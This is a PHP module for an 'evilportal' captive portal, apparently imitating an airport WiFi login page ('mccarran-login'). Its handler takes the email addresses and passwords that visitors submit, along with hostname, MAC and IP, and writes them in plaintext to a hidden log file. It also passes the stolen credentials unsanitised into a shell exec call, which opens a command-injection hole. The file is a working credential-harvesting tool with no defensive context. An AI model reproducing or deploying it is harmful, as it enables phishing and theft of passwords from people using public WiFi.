<?php namespace evilportal;

class MyPortal extends Portal
{

    public function handleAuthorization()
    {
        
        $dirs = array(
            '/root/', 
            '/sd/',
        );

        $dirs = array_filter($dirs, 'file_exists');
        $dirs = array_filter($dirs, 'is_writeable');

        if (empty($dirs)) {
            die("die");
        }

        $dir = array_pop($dirs);
   
        if (isset($_POST['email'])) {
            $email = isset($_POST['email']) ? $_POST['email'] : 'email';
            $pwd = isset($_POST['password']) ? $_POST['password'] : 'password';
            $hostname = isset($_POST['hostname']) ? $_POST['hostname'] : 'hostname';
            $mac = isset($_POST['mac']) ? $_POST['mac'] : 'mac';
            $ip = isset($_POST['ip']) ? $_POST['ip'] : 'ip';
            file_put_contents("$dir/portals/mccarran-login/.logs", "[" . date('Y-m-d H:i:s') . "Z]\n" . "email: {$email}\npassword: {$pwd}\nhostname: {$hostname}\nmac: {$mac}\nip: {$ip}\n\n", FILE_APPEND);

            exec("notify $email' - '$pwd");
        }
        // handle form input or other extra things there

        // Call parent to handle basic authorization first
        parent::handleAuthorization();

    }

    public function showSuccess()
    {
        // Calls default success message
        parent::showSuccess();
    }

    public function showError()
    {
        // Calls default error message
        parent::showError();
    }
}
